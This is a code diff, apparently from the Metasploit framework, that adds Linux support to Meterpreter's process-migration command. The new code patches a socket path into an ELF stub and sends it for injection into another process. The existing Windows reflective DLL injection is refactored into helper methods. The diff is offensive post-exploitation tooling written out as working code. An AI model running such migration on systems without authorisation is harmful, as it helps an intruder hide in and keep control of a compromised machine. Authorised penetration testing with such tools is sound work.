@@ -25,6 +25,9 @@ module Meterpreter
 ###
 class ClientCore < Extension
 
+  UNIX_PATH_MAX = 108
+  DEFAULT_SOCK_PATH = "/tmp/meterpreter.sock"
+
   #
   # Initializes the 'core' portion of the meterpreter client commands.
   #
@@ -180,11 +183,13 @@ class ClientCore < Extension
   # Migrates the meterpreter instance to the process specified
   # by pid.  The connection to the server remains established.
   #
-  def migrate( pid )
+  def migrate(pid, writable_dir = nil)
     keepalive = client.send_keepalives
     client.send_keepalives = false
     process       = nil
     binary_suffix = nil
+    old_platform      = client.platform
+    old_binary_suffix = client.binary_suffix
 
     # Load in the stdapi extension if not allready present so we can determine the target pid architecture...
     client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )
@@ -202,63 +207,58 @@ class ClientCore < Extension
       raise RuntimeError, "Cannot migrate into non existent process", caller
     end
 
-    # We cant migrate into a process that we are unable to open
-    if process['arch'].nil? or process['arch'].empty?
-      raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
+    # We cannot migrate into a process that we are unable to open
+    # On linux, arch is empty even if we can access the process
+    if client.platform =~ /win/
+      if process['arch'] == nil || process['arch'].empty?
+        raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
+      end
     end
 
-    # And we also cant migrate into our own current process...
+    # And we also cannot migrate into our own current process...
     if process['pid'] == client.sys.process.getpid
       raise RuntimeError, "Cannot migrate into current process", caller
     end
 
-    # Create a new payload stub
-    c = Class.new( ::Msf::Payload )
-    c.include( ::Msf::Payload::Stager )
+    if client.platform =~ /linux/
+      if writable_dir.blank?
+        writable_dir = tmp_folder
+      end
 
-    # Include the appropriate reflective dll injection module for the target process architecture...
-    if process['arch'] == ARCH_X86
-      c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
-      binary_suffix = "x86.dll"
-    elsif process['arch'] == ARCH_X86_64
-      c.include( ::Msf::Payload::Windows::ReflectiveDllInject_x64 )
-      binary_suffix = "x64.dll"
-    else
-      raise RuntimeError, "Unsupported target architecture '#{process['arch']}' for process '#{process['name']}'.", caller
+      stat_dir = client.fs.filestat.new(writable_dir)
+
+      unless stat_dir.directory?
+        raise RuntimeError, "Directory #{writable_dir} not found", caller
+      end
+      # Rex::Post::FileStat#writable? isn't available
     end
 
-    # Create the migrate stager
-    migrate_stager = c.new()
-
-    dll = MeterpreterBinaries.path('metsrv',binary_suffix)
-    if dll.nil?
-      raise RuntimeError, "metsrv.#{binary_suffix} not found", caller
-    end
-    migrate_stager.datastore['DLL'] = dll
-
-    blob = migrate_stager.stage_payload
-
-    if client.passive_service
-
-      #
-      # Patch options into metsrv for reverse HTTP payloads
-      #
-      Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
-        :ssl            =>  client.ssl,
-        :url            =>  self.client.url,
-        :expiration     => self.client.expiration,
-        :comm_timeout   =>  self.client.comm_timeout,
-        :ua             =>  client.exploit_datastore['MeterpreterUserAgent'],
-        :proxyhost      =>  client.exploit_datastore['PROXYHOST'],
-        :proxyport      =>  client.exploit_datastore['PROXYPORT'],
-        :proxy_type     =>  client.exploit_datastore['PROXY_TYPE'],
-        :proxy_username =>  client.exploit_datastore['PROXY_USERNAME'],
-        :proxy_password =>  client.exploit_datastore['PROXY_PASSWORD']
-
-    end
+    blob = generate_payload_stub(process)
 
     # Build the migration request
     request = Packet.create_request( 'core_migrate' )
+
+    if client.platform =~ /linux/i
+      socket_path = File.join(writable_dir, Rex::Text.rand_text_alpha_lower(5 + rand(5)))
+
+      if socket_path.length > UNIX_PATH_MAX - 1
+        raise RuntimeError, "The writable dir is too long", caller
+      end
+
+      pos = blob.index(DEFAULT_SOCK_PATH)
+
+      if pos.nil?
+        raise RuntimeError, "The meterpreter binary is wrong", caller
+      end
+
+      blob[pos, socket_path.length + 1] = socket_path + "\x00"
+
+      ep = elf_ep(blob)
+      request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
+      request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
+      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
+    end
+
     request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
     request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
     request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
@@ -307,15 +307,28 @@ class ClientCore < Extension
       end
     end
 
-    # Update the meterpreter platform/suffix for loading extensions as we may have changed target architecture
-    # sf: this is kinda hacky but it works. As ruby doesnt let you un-include a module this is the simplest solution I could think of.
-    # If the platform specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change significantly we will need a better way to do this.
-    if process['arch'] == ARCH_X86_64
-      client.platform      = 'x64/win64'
-      client.binary_suffix = 'x64.dll'
+    # Update the meterpreter platform/suffix for loading extensions as we may
+    # have changed target architecture
+    # sf: this is kinda hacky but it works. As ruby doesnt let you un-include a
+    # module this is the simplest solution I could think of. If the platform
+    # specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change
+    # significantly we will need a better way to do this.
+
+    case client.platform
+    when /win/i
+      if process['arch'] == ARCH_X86_64
+        client.platform      = 'x64/win64'
+        client.binary_suffix = 'x64.dll'
+      else
+        client.platform      = 'x86/win32'
+        client.binary_suffix = 'x86.dll'
+      end
+    when /linux/i
+      client.platform        = 'x86/linux'
+      client.binary_suffix   = 'lso'
     else
-      client.platform      = 'x86/win32'
-      client.binary_suffix = 'x86.dll'
+      client.platform        = old_platform
+      client.binary_suffix   = old_binary_suffix
     end
 
     # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
@@ -346,6 +359,94 @@ class ClientCore < Extension
       self.client.send_packet_wait_response(request, 10)
     end
     true
+  end
+
+  private
+
+  def generate_payload_stub(process)
+    case client.platform
+    when /win/i
+      blob = generate_windows_stub(process)
+    when /linux/i
+      blob = generate_linux_stub
+    else
+      raise RuntimeError, "Unsupported platform '#{client.platform}'"
+    end
+
+    blob
+  end
+
+  def generate_windows_stub(process)
+    c = Class.new( ::Msf::Payload )
+    c.include( ::Msf::Payload::Stager )
+
+    # Include the appropriate reflective dll injection module for the target process architecture...
+    if process['arch'] == ARCH_X86
+      c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
+      binary_suffix = "x86.dll"
+    elsif process['arch'] == ARCH_X86_64
+      c.include( ::Msf::Payload::Windows::ReflectiveDllInject_x64 )
+      binary_suffix = "x64.dll"
+    else
+      raise RuntimeError, "Unsupported target architecture '#{process['arch']}' for process '#{process['name']}'.", caller
+    end
+
+    # Create the migrate stager
+    migrate_stager = c.new()
+
+    dll = MeterpreterBinaries.path('metsrv',binary_suffix)
+    if dll.nil?
+      raise RuntimeError, "metsrv.#{binary_suffix} not found", caller
+    end
+    migrate_stager.datastore['DLL'] = dll
+
+    blob = migrate_stager.stage_payload
+
+    if client.passive_service
+
+      #
+      # Patch options into metsrv for reverse HTTP payloads
+      #
+      Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
+        :ssl            =>  client.ssl,
+        :url            =>  self.client.url,
+        :expiration     => self.client.expiration,
+        :comm_timeout   =>  self.client.comm_timeout,
+        :ua             =>  client.exploit_datastore['MeterpreterUserAgent'],
+        :proxyhost      =>  client.exploit_datastore['PROXYHOST'],
+        :proxyport      =>  client.exploit_datastore['PROXYPORT'],
+        :proxy_type     =>  client.exploit_datastore['PROXY_TYPE'],
+        :proxy_username =>  client.exploit_datastore['PROXY_USERNAME'],
+        :proxy_password =>  client.exploit_datastore['PROXY_PASSWORD']
+
+    end
+
+    blob
+  end
+
+  def generate_linux_stub
+    file = ::File.join(Msf::Config.data_directory, "meterpreter", "msflinker_linux_x86.bin")
+    blob = ::File.open(file, "rb") {|f|
+      f.read(f.stat.size)
+    }
+
+    blob
+  end
+
+  def elf_ep(payload)
+    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
+    ep = elf.elf_header.e_entry
+    return ep
+  end
+
+  def tmp_folder
+    tmp = client.sys.config.getenv('TMPDIR')
+
+    if tmp.blank?
+      tmp = '/tmp'
+    end
+
+    tmp
   end
 
 end
